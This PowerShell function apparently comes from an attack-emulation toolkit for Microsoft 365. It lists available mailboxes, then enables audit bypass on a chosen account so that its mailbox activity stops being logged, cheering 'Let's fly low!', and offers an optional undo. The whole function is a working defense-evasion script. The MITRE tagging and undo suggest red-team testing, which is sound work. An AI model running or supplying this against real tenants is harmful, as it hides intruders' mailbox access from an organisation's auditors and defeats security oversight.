function DisableMailboxAuditing{

    mitre_details("DisableMailboxAuditing")

    #Recon available mailboxes
    $inititate_recon = Read-Host -Prompt "`nInitiate recon to retrive available mailbox addresses (Yes/No)"
    if ($inititate_recon -notin "No","no","N","n"){
        Get-Mailbox | Format-Table -Property DisplayName,PrimarySmtpAddress 
    }
    else {
        #DoNothing
    }

    $InternalUserName = Read-Host -Prompt 'Enter account you would like to disable auditing for'

    Get-MailboxAuditBypassAssociation -Identity $InternalUserName | Format-Table AuditBypassEnabled

    $user_confirm = Read-Host -Prompt "Confirm disbaling Audit logging for this account? (yes/no)"

    if ($user_confirm -notin "No","no","N","n") {
        try {
            Write-Host "Disabling mailbox auditing for $InternalUserName ..."
            Set-MailboxAuditBypassAssociation -Identity $InternalUserName -AuditByPassEnabled $true -ErrorAction Stop
            Start-Sleep -s 60
            Get-MailboxAuditBypassAssociation -Identity $InternalUserName | Format-Table AuditBypassEnabled
            Write-Host "Let's fly low! Successfully disabled auditing!!!" -ForegroundColor Yellow -BackgroundColor Black
            $allow_undo = $true
        }
        catch {
            Write-Host "Error: Failed to disable auditing on mailbox $InternalUserName!!!" -ForegroundColor Yellow -BackgroundColor Black
        }      
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        Write-Host "`n"
        $user_confirm = Read-Host -Prompt 'Would you like to re-enable logging for the account? (yes/no)'

        if ($user_confirm -notin "No","no","N","n") {
            Write-Host "Re-enabling mailbox auditing for $InternalUserName ..."
            Set-MailboxAuditBypassAssociation -Identity $InternalUserName -AuditByPassEnabled $false
            Start-Sleep -s 60    
            Get-MailboxAuditBypassAssociation -Identity $InternalUserName | Format-Table AuditBypassEnabled 
            Write-Host "Undo successful: Re-enabled auditing!!!" -ForegroundColor Yellow -BackgroundColor Black
        }
    }
    Pause
}